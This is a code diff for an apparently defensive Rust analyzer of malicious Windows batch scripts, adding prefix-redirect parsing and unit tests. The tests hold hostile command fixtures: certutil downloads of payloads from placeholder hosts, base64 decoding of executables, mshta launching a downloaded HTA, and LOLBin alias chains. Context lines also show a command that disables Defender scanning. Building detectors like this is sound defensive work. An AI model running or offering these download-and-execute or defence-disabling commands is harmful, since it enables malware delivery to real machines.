@@ -933,6 +933,35 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
     }
 
     #[test]
+    fn block_prefix_redirect_writes_file_for_certutil_decode() {
+        use base64::Engine;
+
+        let b64 = base64::engine::general_purpose::STANDARD.encode(b"prefix redirect payload");
+        let (a, b) = b64.split_at(b64.len() / 2);
+        let script = format!(
+            "set \"tempB64File=%TEMP%\\embedded.b64\"\r\n\
+             set \"outputExe=%TEMP%\\embedded.exe\"\r\n\
+             > \"%tempB64File%\" (\r\n\
+             echo {a}\r\n\
+             echo {b}\r\n\
+             \r\n\
+             )\r\n\
+             certutil -decode \"%tempB64File%\" \"%outputExe%\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::CertutilDecode { src_resolved, .. } if *src_resolved)),
+            "prefix-redirect block b64 should resolve the certutil source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn block_echo_b64_polyglot_certutil_call_extracts_inner_url() {
         // The 8270 idiom: write a base64 bat/PS polyglot via a `(echo...) > f`
         // block, `certutil -decode` it, `call` it. The polyglot's PS half is
@@ -7318,9 +7347,19 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
             crate::handlers::set::h_set(stripped, &mut scratch);
         }
         let opener = lines[i].trim_start_matches(['@', ' ', '\t']).trim_end();
-        // A bare `(` opens a grouped block (possibly `@(`). Anything else
-        // (e.g. `if (`, `for ... (`) is handled by the normal interpreter.
-        if opener != "(" {
+        let opener_target = if opener == "(" {
+            None
+        } else if opener.ends_with('(') {
+            let before_paren = opener.trim_end_matches('(').trim();
+            let (_, redir) = crate::redirect::extract_redirections(before_paren);
+            redir.stdout
+        } else {
+            None
+        };
+        // A bare `(` opens a grouped block (possibly `@(`). CMD also permits
+        // prefix redirection (`> file (`). Anything else (e.g. `if (`,
+        // `for ... (`) is handled by the normal interpreter.
+        if opener != "(" && opener_target.is_none() {
             i += 1;
             continue;
         }
@@ -7335,6 +7374,10 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
             if body_trimmed.starts_with(')') {
                 close_idx = Some(j);
                 break;
+            }
+            if body_trimmed.is_empty() {
+                j += 1;
+                continue;
             }
             // Recognize `echo X` / `echo.X` / `echo:X` / bare `echo`.
             if let Some(payload) = block_echo_payload(body) {
@@ -7353,14 +7396,19 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) {
             i = close + 1;
             continue;
         }
-        // The closing line must redirect the block's stdout to a file.
-        let close_line = lines[close].trim_start_matches(['@', ' ', '\t']);
-        // Strip the leading `)` then parse redirections from the remainder.
-        let after_paren = close_line.trim_start_matches(')').trim();
-        let (_, redir) = crate::redirect::extract_redirections(after_paren);
-        let Some(target) = redir.stdout else {
-            i = close + 1;
-            continue;
+        let target = if let Some(target) = opener_target {
+            target
+        } else {
+            // The closing line must redirect the block's stdout to a file.
+            let close_line = lines[close].trim_start_matches(['@', ' ', '\t']);
+            // Strip the leading `)` then parse redirections from the remainder.
+            let after_paren = close_line.trim_start_matches(')').trim();
+            let (_, redir) = crate::redirect::extract_redirections(after_paren);
+            let Some(target) = redir.stdout else {
+                i = close + 1;
+                continue;
+            };
+            target
         };
         // Var-expand the redirect target — without this, `> "%_t%"` stores
         // the file under the literal key `%_t%`, but the following
@@ -13328,6 +13376,38 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_skips_slash_force_flag() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("hello").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode /f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decode /f paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
+            ),
+            "dst.bin was not decoded: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
     fn certutil_decode_accepts_slash_prefixed_flags() {
         let mut env = Environment::new(&Config::default());
         let payload = "hello slash";
@@ -13362,6 +13442,38 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_slash_decode_writes_fs_entry() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("slash decode").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil /decode /f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil /decode paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"slash decode"
+            ),
+            "dst.bin was not decoded from /decode: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
     fn certutil_decode_current_dir_source_resolves_tracked_content() {
         let mut env = Environment::new(&Config::default());
         let payload = "current dir source";
@@ -13390,6 +13502,39 @@ mod certutil_tests {
                 Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
             ),
             "dst.bin was not decoded from current-dir source content: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_basename_source_resolves_full_path_content() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "basename source";
+        env.modified_filesystem.insert(
+            r#"c:\temp\src.b64"#.to_string(),
+            FsEntry::Content {
+                content: b64(payload).into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil basename source was not marked resolved: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
+            ),
+            "dst.bin was not decoded from full-path source content: {:?}",
             env.modified_filesystem.get("dst.bin")
         );
     }
@@ -13558,6 +13703,78 @@ mod certutil_tests {
             ),
             "dst.bin was not decoded from NEW CERTIFICATE REQUEST wrapper: {:?}",
             env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_pe_adds_recovered_blob() {
+        use base64::Engine;
+
+        let mut env = Environment::new(&Config::default());
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: base64::engine::general_purpose::STANDARD
+                    .encode(&pe)
+                    .into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode src.b64 dst.exe", &mut env);
+        crate::collect_decoded_pe_artifacts(&mut env);
+
+        assert!(
+            env.recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("certutil") && blob == &pe),
+            "decoded PE was not exposed as recovered blob: {:?}",
+            env.recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn certutil_decode_self_new_certificate_request_recovers_pe() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "certutil -decode \"%~f0\" payload.exe\r\n-----BEGIN NEW CERTIFICATE REQUEST-----\r\n{b64}\r\n-----END NEW CERTIFICATE REQUEST-----\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "%~f0" && dst == "payload.exe" && *src_resolved
+            )),
+            "self certutil decode trait missing/resolution false: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("certutil") && blob == &pe),
+            "NEW CERTIFICATE REQUEST PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
         );
     }
 
@@ -13768,6 +13985,57 @@ mod certutil_tests {
             env.traits
         );
         assert!(env.modified_filesystem.contains_key("slash-after.exe"));
+    }
+
+    #[test]
+    fn certutil_urlcache_skips_slash_flag_after_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("certutil -urlcache http://x/y.exe /f out.exe", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst } if url == "http://x/y.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil -urlcache slash flag was parsed as destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_verifyctl_emits_download_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil -verifyctl -f https://certutil-verifyctl.example/payload.cab out.cab",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl.example/payload.cab" && dst == "out.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil -verifyctl download was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_encode_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"certutil -encode "%%~A" "%%~nA.enc""#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "certutil" && cmd == r#"certutil -encode "%%~A" "%%~nA.enc""#
+            )),
+            "certutil -encode did not emit LOLBAS provenance: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -29121,6 +29389,29 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn copied_certutil_alias_nested_after_cmd_c_emits_decode_trait() {
+        let report = crate::analyze(
+            br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
+C:\Users\Public\expha.pif /c /y "C:\Windows\System32\certutil.exe" "C:\Users\Public\ghf.pif"
+C:\Users\Public\alpha.pif /C C:\Users\Public\ghf.pif -decodehex -f "%~f0" "C:\Users\Public\HEW.3GP" 9
+"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::CertutilDecode { src, dst, .. }
+                    if src == "%~f0" && dst == r#"C:\Users\Public\HEW.3GP"#
+            )
+        });
+        assert!(
+            has,
+            "copied certutil alias did not replay nested decode command: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_bitsadmin_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
@@ -30552,6 +30843,81 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
     }
 
     #[test]
+    fn certutil_urlcache_slash_flag_after_url_in_deob_text_is_not_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -urlcache https://cert-deob.example/payload.exe /f C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://cert-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil deob-text slash flag was parsed as destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_urlcache_slash_option_prefix_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp /urlcache /split /f https://slash-cert-deob.example/payload.exe C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://slash-cert-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "slash-prefixed deob-text certutil urlcache was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_verifyctl_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -verifyctl -f https://certutil-verifyctl-deob.example/payload.cab C:\Temp\payload.cab"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl-deob.example/payload.cab"
+                        && dst == "C:\\Temp\\payload.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil verifyctl deob-text source was not structured: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("certutil-verifyctl-deob.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "certutil verifyctl URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_certutil_text_does_not_emit_structured_download() {
         let report = analyze(
             br#"echo keep ^& certutil -urlcache -split -f http://evil.example/p.exe p.exe"#,
@@ -30633,6 +30999,60 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
                 )
             }),
             "implicit certutil destination in deob text was not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_implicit_basename_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "certutil -urlcache -split -f https://certutil-implicit-deob.example/payload.hta\r\nmshta payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::CertutilDownload { url, dst }
+                        if url == "https://certutil-implicit-deob.example/payload.hta"
+                            && dst == "payload.hta"
+                )
+            }),
+            "implicit certutil destination in deob text was not structured: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta payload.hta"
+                            && url == "https://certutil-implicit-deob.example/payload.hta"
+                )
+            }),
+            "certutil implicit HTA in deob text was not linked to mshta: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "certutil -urlcache -split -f https://certutil-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://certutil-mshta.example/payload.hta"
+                )
+            }),
+            "certutil-downloaded HTA in deob text was not linked to mshta: {:?}",
             env.traits
         );
     }
